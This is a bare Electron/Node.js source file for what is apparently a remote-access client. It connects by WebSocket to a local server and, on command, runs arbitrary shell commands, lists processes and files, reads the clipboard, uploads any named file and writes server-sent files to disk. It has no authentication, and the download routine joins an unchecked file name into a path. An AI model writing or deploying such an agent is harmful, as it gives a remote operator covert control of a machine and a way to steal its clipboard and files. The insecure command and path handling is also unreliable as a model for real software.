const { app, BrowserWindow, clipboard } = require('electron');
const WebSocket = require('ws');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

let mainWindow;
let ws;

function createWindow() {
  mainWindow = new BrowserWindow({
    width: 800,
    height: 600,
  });
  mainWindow.loadFile('index.html');
  ws = new WebSocket('ws://127.0.0.1:8081/ws');

  ws.on('open', () => {
    ws.send(JSON.stringify({ device_name: 'YourDeviceName' }));
  });

  ws.on('message', (message) => {
    const data = JSON.parse(message);
    handleServerCommand(data,ws);
  });
}

function handleServerCommand(data,ws) {
  console.log(data.command);
  switch (true) {
    case data.command == 'list_processes':
      exec('ps aux', (err, stdout) => {
        if (!err) sendResponse(stdout);
      });
      break;
    case data.command == 'list_files':
      fs.readdir(process.cwd(), (err, files) => {
        const fileListAsString = files.join(', ');
        console.log(fileListAsString);
        if (!err) sendResponse(fileListAsString);
      });
      break;
    case data.command == 'get_clipboard':
      sendResponse(clipboard.readText());
      break;
    case data.command && data.command.startsWith('upload_file'):
      const part1 = data.command.split(' ');
      if (part1.length > 1) {
        const fileName = part1.slice(1).join(' ');
        uploadFile(ws,fileName);
      } else {
        console.error('Invalid command format: file name is missing.');
      }
      break;
    case data.command == 'download_file':
      downloadFile(data.fileName);
      break;
    case data.command && data.command.startsWith('execute_command'):
      console.log(data.command.split(' ').slice(1).join(' '))
      exec(data.command.split(' ').slice(1).join(' '), (err, stdout) => {
        if (!err) sendResponse(stdout);
      });
      break;
    default:
      console.log('Unknown command');
  }
}

function sendResponse(result) {
  console.log(JSON.stringify({ action: "send_result",status:"success",result: result }))
  ws.send(JSON.stringify({ action: "send_result",status:"success",result: result }));
}

function uploadFile(ws, filePath) {
  try {
    const fileName = path.basename(filePath);
    const fileSize = fs.statSync(filePath).size;

    const request = {
      action: "upload_file",
      filename: fileName,
      filesize: fileSize,
    };
    ws.send(JSON.stringify(request));
    console.log(`Upload request sent for file: ${fileName} (${fileSize} bytes)`);

    const readStream = fs.createReadStream(filePath, { highWaterMark: 1024 * 4 });
    readStream.on("data", (chunk) => {
      ws.send(chunk);
    });

    readStream.on("end", () => {
      const completedMessage = { action: "upload_completed" };
      ws.send(JSON.stringify(completedMessage));
      console.log(`Upload completed for file: ${fileName}`);
      cleanupUpload();
    });

    readStream.on("error", (err) => {
      console.error(`Error reading file ${filePath}:`, err);
      cleanupUpload();
    });

    ws.on("error", (err) => {
      console.error("WebSocket error during upload:", err);
      cleanupUpload();
    });

    ws.on("close", () => {
      console.log("WebSocket connection closed during upload.");
      cleanupUpload();
    });

    function cleanupUpload() {
      if (readStream) {
        readStream.close();
      }
    }
  } catch (err) {
    console.error(`Error initiating upload: ${err.message}`);
  }
}

function downloadFile(fileName) {
  const filePath = path.join(os.tmpdir(), fileName);
  ws.send(JSON.stringify({ command: 'request_file', fileName }));
  ws.on('message', (message) => {
    const data = JSON.parse(message);
    if (data.command === 'file_download' && data.fileName === fileName) {
      fs.writeFile(filePath, Buffer.from(data.data, 'base64'), (err) => {
        if (err) return console.error(err);
        sendResponse(`File downloaded to ${filePath}`);
      });
    }
  });
}

app.whenReady().then(createWindow);
